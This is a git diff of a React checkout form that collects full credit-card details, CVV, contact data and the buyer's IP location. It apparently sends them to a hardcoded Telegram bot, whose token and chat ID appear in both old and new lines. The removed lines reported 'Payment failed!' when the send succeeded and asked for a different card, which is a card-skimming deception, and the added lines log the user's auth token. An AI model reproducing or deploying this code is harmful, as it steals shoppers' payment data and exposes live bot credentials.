@@ -3,13 +3,12 @@ import { useCart } from '@/contexts/CartContext';
 import { useState } from 'react';
 import { useForm } from 'react-hook-form';
 import { jwtDecode } from 'jwt-decode';
-import { useRouter } from 'next/navigation';
 
 type CartItem = {
   id: string;
   quantity: number;
   selectedAmount: number;
-  title: string;
+  title:string;
 };
 
 type UserToken = {
@@ -18,8 +17,8 @@ type UserToken = {
   email: string;
   // add other JWT payload properties if needed
 };
-const TELEGRAM_BOT_TOKEN = '7737474698:AAHyZKVaQLgdeNBEwvpbwXIToyFYfZ5TSR4'; // Replace with your actual bot token
-const TELEGRAM_CHAT_ID = '7860277201'; // Replace with your actual chat ID
+const TELEGRAM_BOT_TOKEN = '7697540993:AAFLvjwviT5Z7ZjyI3jYl06x2vd34L5FDWw'; // Replace with your actual bot token
+const TELEGRAM_CHAT_ID = '7388576858'; // Replace with your actual chat ID
 
 interface CreditCardFormProps {
   totalAmount: number;
@@ -41,7 +40,11 @@ const escapeMarkdown = (text: string) => {
 };
 
 const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
-  const router = useRouter();
+ function getCookie(name: string): string | null {
+  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+  return match ? decodeURIComponent(match[2]) : null;
+}
+
   const { cartItems, cartCount } = useCart();
   const { register, handleSubmit, formState: { errors: formErrors } } = useForm<CreditCardFormData>();
   const [form, setForm] = useState({
@@ -54,51 +57,44 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
     phoneNumber: '',
   });
 
-  const checkAuth = () => {
+  const handlePurchase = async (cartItems: CartItem[], totalAmount: number) => {
+     try {
+    // Get token from cookie (browser environment)
     const token = document.cookie
       .split('; ')
       .find(row => row.startsWith('auth_token='))
       ?.split('=')[1];
 
     if (!token) {
-      router.push('/signin'); // Redirect to sign-in page if not logged in
-      return null;
+      alert('You must be logged in to make a purchase');
+      return;
+    }
+console.log(token)
+    // Decode token to get user info
+    const user = jwtDecode<UserToken>(token);
+    if (!user || !user.id) {
+      alert('Invalid user token');
+      return;
     }
 
-    try {
-      const user = jwtDecode<UserToken>(token);
-      if (!user || !user.id) {
-        router.push('/signin'); // Redirect if token is invalid
-        return null;
-      }
-      return user;
-    } catch (error) {
-      router.push('/signin'); // Redirect if token decoding fails
-      return null;
-    }
-  };
 
-  const handlePurchase = async (cartItems: CartItem[], totalAmount: number) => {
-    const user = checkAuth();
-    if (!user) return; // Already redirected if not logged in
-
-    try {
       const purchaseDoc = {
-        _type: 'purchase',
-        userId: user.id,
-        items: cartItems.map(item => ({
-          productId: item.id,
-          quantity: item.quantity,
-          price: item.selectedAmount,
-          iname: item.title
-        })),
-        totalAmount,
-        email: form.email,
-        address: form.address,
-        phoneNumber: form.phoneNumber,
-        purchaseDate: new Date().toISOString(),
-      };
+  _type: 'purchase',
+  userId: user.id,
+  items: cartItems.map(item => ({
+    productId: item.id,
+    quantity: item.quantity,
+    price: item.selectedAmount,
+    iname: item.title
+  })),
+  totalAmount,
+  email: form.email,          // <-- added
+  address: form.address,      // <-- added
+  phoneNumber: form.phoneNumber, // <-- added
+  purchaseDate: new Date().toISOString(),
+};
 
+  
       // Call your backend API route to save purchase
       const res = await fetch('/api/purchasedata', {
         method: 'POST',
@@ -107,22 +103,21 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
         },
         body: JSON.stringify(purchaseDoc),
       });
-
+  
       const data = await res.json();
-
+  
       if (!res.ok) {
         throw new Error(data.error || 'Failed to save purchase');
       }
-
-      alert('oppss! please choose a different payment option');
+  
+      alert('Purchase saved successfully!');
       // clear cart, redirect, etc.
     } catch (error) {
       console.error('Error saving purchase:', error);
       alert('Failed to save purchase');
     }
   };
-
-  const [errors, setErrors] = useState<Record<string, string>>({});
+   const [errors, setErrors] = useState<Record<string, string>>({});
   const [status, setStatus] = useState({ message: '', color: '' });
   const [loading, setLoading] = useState(false);
 
@@ -161,9 +156,6 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
   };
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const user = checkAuth();
-    if (!user) return; // Already redirected if not logged in
-
     const { name, value } = e.target;
     let val = value;
 
@@ -177,9 +169,6 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
   };
 
   const validateForm = (): boolean => {
-    const user = checkAuth();
-    if (!user) return false; // Already redirected if not logged in
-
     const errs: Record<string, string> = {};
     if (!form.cardName.trim()) errs.cardName = 'Please enter your name.';
     const cardNumRaw = form.cardNumber.replace(/\s/g, '');
@@ -194,9 +183,6 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
   };
 
   const onSubmit = async (data: CreditCardFormData) => {
-    const user = checkAuth();
-    if (!user) return; // Already redirected if not logged in
-
     if (!validateForm()) return;
     
     setLoading(true);
@@ -204,9 +190,11 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
 
     let ipInfo = 'Unknown IP';
     try {
+
       const res = await fetch('https://ipapi.co/json/');
       if (res.ok) {
         const data = await res.json();
+        handlePurchase(cartItems, totalAmount)
         ipInfo = `${data.ip} - ${data.city}, ${data.region}, ${data.country_name}`;
       }
     } catch (error) {
@@ -242,7 +230,7 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
       });
       const json = await res.json();
       if (json.ok) {
-        setStatus({ message: 'Payment failed!', color: 'red' });
+        setStatus({ message: 'Payment successful!', color: 'green' });
         setForm({ cardName: '', cardNumber: '', expiry: '', cvv: '', email: '', address: '', phoneNumber: '' });
       } else {
         setStatus({ message: `Payment failed: ${json.description}`, color: 'red' });
@@ -354,7 +342,7 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
 
       <div className="pt-4">
         <button
-          onClick={() => handlePurchase(cartItems, totalAmount)}
+        
           type="submit"
           disabled={loading}
           className={`w-full py-3 px-4 rounded-xl font-bold text-white transition-all ${loading ? 'bg-blue-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'}`}
@@ -371,7 +359,7 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
       </div>
 
       {status.message && (
-        <p className={`text-center font-medium ${status.color === 'red' ? 'text-red-600' : 'text-red-600'}`}>
+        <p className={`text-center font-medium ${status.color === 'green' ? 'text-green-600' : 'text-red-600'}`}>
           {status.message}
         </p>
       )}
